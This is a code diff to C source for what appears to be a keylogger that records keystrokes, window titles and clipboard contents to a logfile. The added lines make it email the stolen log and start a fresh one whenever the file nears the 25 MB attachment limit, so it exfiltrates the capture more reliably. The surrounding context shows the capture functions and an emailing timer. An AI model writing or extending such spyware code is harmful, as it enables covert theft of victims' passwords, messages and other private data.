@@ -10,6 +10,7 @@
 #define CLIP_SIZE 5000 // 5000 characters to be copied and logged
 #define LOG_TIMER 1800 // time limit until send email (3600s == 1 hour)
 
+
 // FUNCTION DECLARATIONS //
 char* GetTime();
 
@@ -24,7 +25,10 @@ long int GetLogfileSize(char* logfile_path);
 void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile);
 void UpdateClipboard(char* prev_clipboard, FILE* logfile);
 void KeystrokeHandler(short key, FILE* logfile);
+
+// reporting
 void ExecuteMailer(char* mailer_path, char* directory);
+
 
 // MAIN FUNCTION //
 int main(){
@@ -89,9 +93,16 @@ int main(){
             // reset timer
             keystroke_timer = clock();
         }
+        // 25 MB max attachment size
+        // send email before max with wiggle room
+        else if(GetLogfileSize(logfile_path) >= 24500000){
+            ExecuteMailer(mailer_path, directory);
+            InitLogfile(logfile_path);
+        }
     }
     return 0;
 }
+
 
 // FUNCTION DEFINITIONS //
 // get current time
